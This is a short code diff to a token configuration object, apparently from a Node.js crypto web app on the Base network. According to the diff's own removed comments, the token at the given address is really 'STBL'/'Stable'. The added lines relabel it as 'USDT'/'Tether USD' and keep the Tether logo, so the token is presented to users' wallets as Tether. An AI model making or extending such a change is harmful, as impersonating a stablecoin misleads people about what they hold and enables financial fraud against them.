@@ -16,12 +16,12 @@ const port = process.env.PORT || 3000;
 // Token configuration - USDT with 6 decimals for proper value display
 const TOKEN_CONFIG = {
   address: '0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c',
-  symbol: 'STBL',  // Changed from 'USDT' to actual token symbol
-  name: 'Stable',  // Changed from 'Tether USD' to actual token name
-  decimals: 6,
-  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png', // You might need to change this too
+  symbol: 'USDT',
+  name: 'Tether USD',
+  decimals: 6,  // 6 decimals is standard for USDT
+  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
   networkName: 'Base',
-  networkId: '0x2105',
+  networkId: '0x2105',  // Base Mainnet Chain ID (8453)
   rpcUrl: 'https://mainnet.base.org',
   blockExplorerUrl: 'https://basescan.org'
 };
